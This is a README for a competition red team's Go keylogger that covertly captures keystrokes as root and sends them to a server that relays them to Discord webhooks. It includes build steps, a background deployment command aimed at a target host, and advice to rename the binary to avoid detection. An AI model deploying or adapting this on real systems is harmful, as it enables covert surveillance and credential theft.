# Keyboard-Vulture
<p align="center">
  <img src="https://cdn.mos.cms.futurecdn.net/ywDAmc9ikSaceqm7taFSuP.jpg" />
</p>

## What is this tool?
Keyboard Vulture is a basic Linux keylogger written in Go. When run as root, it captures keyboard input and sends it to a server over SYSLOG. The server then posts the keystrokes to Discord using webhooks. 

## Why does this tool exist?
This tool is a part of the [Sinister Scripts](https://github.com/nos3curity/Sinister-Scripts) suite of homegrown APT tools developed by the [Cal Poly Pomona SWIFT](https://www.calpolyswift.org/) club Red Team for the Red vs. Blue competition. Keyboard Vulture is only made for this single purpose and if you plan on using it for something actually malicious, maybe reconsider your life choices.

## How do you set up the server?
First, create a channel for every team in your Discord server and restrict access to them to just Red Team. Go to each channel's settings and create webhook URL's.

Second, create the `./Server/.teams` file with Discord webhooks for every team's channel with the following syntax:
```
TEAM1=https://discord.com/api/webhooks/...
TEAM2=https://discord.com/api/webhooks/...
TEAM3=https://discord.com/api/webhooks/...
TEAM4=https://discord.com/api/webhooks/...
```

Lastly, either use a prebuilt binary from the latest release or build it from source as such:
```
cd Server && go build
```

You can now start the server as such or add the optional command line flags from `./Server -h`:
```
./Server
```

## How do you set up the agent?
First, either grab a prebuilt binary or build it from source as such:
```
cd Agent && go build
```

Once you transfer the binary to the target system, ensure you are running it as root like the following (make sure to rename the file for OPSEC):
```
chmod +x Agent
./Agent -s 192.168.10.10 -p 80 -t 1 &
```
- `-s` specifies the IP of the Vulture server
- `-p` specifies the port of the Vulture server
- `-t` specifies the team number for the webhook
- ` &` sends the process to the background

That's it. You should now be all set. Keystrokes get sent home when ENTER is pressed on the keyboard.